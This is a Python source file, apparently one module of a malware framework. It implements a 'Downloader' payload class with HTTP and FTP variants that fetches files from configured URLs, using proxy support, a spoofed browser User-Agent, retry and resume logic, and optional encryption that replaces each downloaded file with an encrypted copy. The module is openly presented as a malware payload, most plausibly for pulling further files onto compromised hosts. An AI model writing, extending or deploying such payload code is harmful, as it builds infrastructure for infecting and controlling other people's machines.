#!/usr/bin/env python3
"""
Downloader Module for Malware Framework
Provides file download capabilities with proxy support
"""

import os
import sys
import time
import threading
from typing import Dict, Any, List, Optional, Union
import logging
from pathlib import Path
import hashlib
import urllib.parse

from core.base_payload import BasePayload
from core.encryption import EncryptionManager
from core.utils import SystemUtils, NetworkUtils, FileUtils

logger = logging.getLogger(__name__)

class Downloader(BasePayload):
    """Downloader payload implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize downloader"""
        super().__init__(config)
        self.name = "Downloader"
        self.description = "File downloader with proxy support and encryption"
        
        # Downloader configuration
        self.urls = config.get('urls', [])
        self.output_dir = config.get('output_dir', 'downloads')
        self.proxy = config.get('proxy', None)
        self.headers = config.get('headers', {})
        self.timeout = config.get('timeout', 30)
        self.retry_count = config.get('retry_count', 3)
        self.retry_delay = config.get('retry_delay', 5)
        self.verify_ssl = config.get('verify_ssl', True)
        self.encrypt_files = config.get('encrypt_files', False)
        self.resume_downloads = config.get('resume_downloads', True)
        
        # Downloader state
        self.downloads = []
        self.active_downloads = {}
        self.completed_downloads = []
        self.failed_downloads = []
        
        # Encryption for files
        if self.encrypt_files:
            self.encryption = EncryptionManager(config.get('encryption', {}))
        else:
            self.encryption = None
    
    def _initialize_payload(self) -> None:
        """Initialize downloader specific components"""
        # Create output directory
        self.output_path = Path(self.output_dir)
        self.output_path.mkdir(parents=True, exist_ok=True)
        
        # Setup default headers
        if not self.headers:
            self.headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        
        logger.info(f"Downloader initialized: {self.output_path}")
    
    def execute(self) -> bool:
        """Execute the downloader"""
        try:
            if not self.urls:
                logger.warning("No URLs provided for download")
                return False
            
            # Start downloads
            return self._execute_downloads()
        
        except Exception as e:
            logger.error(f"Downloader execution failed: {e}")
            return False
    
    def _execute_downloads(self) -> bool:
        """Execute all downloads"""
        try:
            # Create download threads
            threads = []
            for url in self.urls:
                thread = threading.Thread(
                    target=self._download_file,
                    args=(url,),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
            
            # Wait for all downloads to complete
            for thread in threads:
                thread.join()
            
            # Log results
            logger.info(f"Downloads completed: {len(self.completed_downloads)} successful, "
                       f"{len(self.failed_downloads)} failed")
            
            return len(self.failed_downloads) == 0
        
        except Exception as e:
            logger.error(f"Download execution failed: {e}")
            return False
    
    def _download_file(self, url: str) -> bool:
        """Download a single file"""
        try:
            # Parse URL
            parsed_url = urllib.parse.urlparse(url)
            filename = os.path.basename(parsed_url.path)
            
            if not filename:
                filename = f"download_{int(time.time())}"
            
            filepath = self.output_path / filename
            
            # Check if file exists and resume is enabled
            resume_pos = 0
            if self.resume_downloads and filepath.exists():
                resume_pos = filepath.stat().st_size
                logger.info(f"Resuming download: {filename} from position {resume_pos}")
            
            # Download file
            success = self._download_with_retry(url, filepath, resume_pos)
            
            if success:
                self.completed_downloads.append({
                    'url': url,
                    'filepath': str(filepath),
                    'size': filepath.stat().st_size if filepath.exists() else 0,
                    'timestamp': time.time()
                })
                logger.info(f"Download completed: {filename}")
                return True
            else:
                self.failed_downloads.append({
                    'url': url,
                    'error': 'Download failed after retries',
                    'timestamp': time.time()
                })
                logger.error(f"Download failed: {filename}")
                return False
        
        except Exception as e:
            logger.error(f"Download error for {url}: {e}")
            self.failed_downloads.append({
                'url': url,
                'error': str(e),
                'timestamp': time.time()
            })
            return False
    
    def _download_with_retry(self, url: str, filepath: Path, resume_pos: int = 0) -> bool:
        """Download file with retry logic"""
        for attempt in range(self.retry_count + 1):
            try:
                if self._download_single_attempt(url, filepath, resume_pos):
                    return True
                
                if attempt < self.retry_count:
                    logger.warning(f"Download attempt {attempt + 1} failed, retrying in {self.retry_delay}s")
                    time.sleep(self.retry_delay)
            
            except Exception as e:
                logger.error(f"Download attempt {attempt + 1} error: {e}")
                if attempt < self.retry_count:
                    time.sleep(self.retry_delay)
        
        return False
    
    def _download_single_attempt(self, url: str, filepath: Path, resume_pos: int = 0) -> bool:
        """Single download attempt"""
        try:
            import requests
            
            # Setup session
            session = requests.Session()
            
            # Setup proxy
            if self.proxy:
                session.proxies = {
                    'http': self.proxy,
                    'https': self.proxy
                }
            
            # Setup headers
            headers = self.headers.copy()
            if resume_pos > 0:
                headers['Range'] = f'bytes={resume_pos}-'
            
            # Make request
            response = session.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                stream=True
            )
            
            response.raise_for_status()
            
            # Check if we can resume
            if resume_pos > 0 and response.status_code != 206:
                logger.warning("Server doesn't support resume, starting from beginning")
                resume_pos = 0
                filepath.unlink(missing_ok=True)
            
            # Download file
            mode = 'ab' if resume_pos > 0 else 'wb'
            with open(filepath, mode) as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            
            # Encrypt file if enabled
            if self.encrypt_files:
                self._encrypt_downloaded_file(filepath)
            
            return True
        
        except Exception as e:
            logger.error(f"Download attempt failed: {e}")
            return False
    
    def _encrypt_downloaded_file(self, filepath: Path) -> bool:
        """Encrypt downloaded file"""
        try:
            if not self.encryption:
                return True
            
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            encrypted_data = self.encryption.encrypt(data)
            
            # Write encrypted file
            encrypted_path = filepath.with_suffix(filepath.suffix + '.encrypted')
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            filepath.unlink()
            
            logger.info(f"File encrypted: {filepath} -> {encrypted_path}")
            return True
        
        except Exception as e:
            logger.error(f"Failed to encrypt file {filepath}: {e}")
            return False
    
    def add_url(self, url: str) -> None:
        """Add URL to download queue"""
        if url not in self.urls:
            self.urls.append(url)
            logger.info(f"Added URL to queue: {url}")
    
    def remove_url(self, url: str) -> bool:
        """Remove URL from download queue"""
        if url in self.urls:
            self.urls.remove(url)
            logger.info(f"Removed URL from queue: {url}")
            return True
        return False
    
    def download_single(self, url: str) -> bool:
        """Download a single file immediately"""
        try:
            return self._download_file(url)
        except Exception as e:
            logger.error(f"Single download failed: {e}")
            return False
    
    def get_download_status(self, url: str) -> Optional[Dict[str, Any]]:
        """Get status of specific download"""
        # Check completed downloads
        for download in self.completed_downloads:
            if download['url'] == url:
                return {'status': 'completed', **download}
        
        # Check failed downloads
        for download in self.failed_downloads:
            if download['url'] == url:
                return {'status': 'failed', **download}
        
        # Check active downloads
        if url in self.active_downloads:
            return {'status': 'active', **self.active_downloads[url]}
        
        return None
    
    def get_all_status(self) -> Dict[str, Any]:
        """Get status of all downloads"""
        return {
            'total': len(self.urls),
            'completed': len(self.completed_downloads),
            'failed': len(self.failed_downloads),
            'active': len(self.active_downloads),
            'completed_downloads': self.completed_downloads,
            'failed_downloads': self.failed_downloads
        }
    
    def verify_download(self, filepath: Union[str, Path]) -> bool:
        """Verify downloaded file integrity"""
        try:
            filepath = Path(filepath)
            if not filepath.exists():
                return False
            
            # Check file size
            if filepath.stat().st_size == 0:
                logger.warning(f"File is empty: {filepath}")
                return False
            
            # Calculate file hash
            file_hash = FileUtils.get_file_hash(filepath)
            logger.info(f"File hash: {filepath} -> {file_hash}")
            
            return True
        
        except Exception as e:
            logger.error(f"File verification failed: {e}")
            return False
    
    def cleanup_downloads(self, keep_days: int = 7) -> int:
        """Clean up old downloaded files"""
        try:
            cutoff_time = time.time() - (keep_days * 24 * 60 * 60)
            removed_count = 0
            
            for filepath in self.output_path.rglob('*'):
                if filepath.is_file() and filepath.stat().st_mtime < cutoff_time:
                    filepath.unlink()
                    removed_count += 1
                    logger.debug(f"Removed old file: {filepath}")
            
            logger.info(f"Cleanup completed: {removed_count} files removed")
            return removed_count
        
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
            return 0
    
    def _cleanup(self) -> None:
        """Cleanup downloader resources"""
        try:
            # Stop active downloads
            for url in list(self.active_downloads.keys()):
                self.active_downloads[url]['cancelled'] = True
            
            logger.info("Downloader cleanup completed")
        
        except Exception as e:
            logger.error(f"Downloader cleanup failed: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get downloader status"""
        status = super().get_status()
        status.update({
            'urls': self.urls,
            'output_dir': str(self.output_path),
            'completed': len(self.completed_downloads),
            'failed': len(self.failed_downloads),
            'active': len(self.active_downloads),
            'proxy': self.proxy is not None,
            'encrypt_files': self.encrypt_files
        })
        return status

class HTTPDownloader(Downloader):
    """HTTP-specific downloader implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "HTTP Downloader"
        self.description = "HTTP/HTTPS file downloader"

class FTPDownloader(Downloader):
    """FTP-specific downloader implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "FTP Downloader"
        self.description = "FTP file downloader"
    
    def _download_single_attempt(self, url: str, filepath: Path, resume_pos: int = 0) -> bool:
        """FTP download implementation"""
        try:
            from ftplib import FTP
            
            parsed_url = urllib.parse.urlparse(url)
            ftp_host = parsed_url.hostname
            ftp_port = parsed_url.port or 21
            ftp_path = parsed_url.path
            ftp_user = parsed_url.username
            ftp_pass = parsed_url.password
            
            # Connect to FTP server
            ftp = FTP()
            ftp.connect(ftp_host, ftp_port, timeout=self.timeout)
            
            if ftp_user and ftp_pass:
                ftp.login(ftp_user, ftp_pass)
            else:
                ftp.login()
            
            # Download file
            mode = 'ab' if resume_pos > 0 else 'wb'
            with open(filepath, mode) as f:
                ftp.retrbinary(f'RETR {ftp_path}', f.write, rest=resume_pos)
            
            ftp.quit()
            return True
        
        except Exception as e:
            logger.error(f"FTP download failed: {e}")
            return False 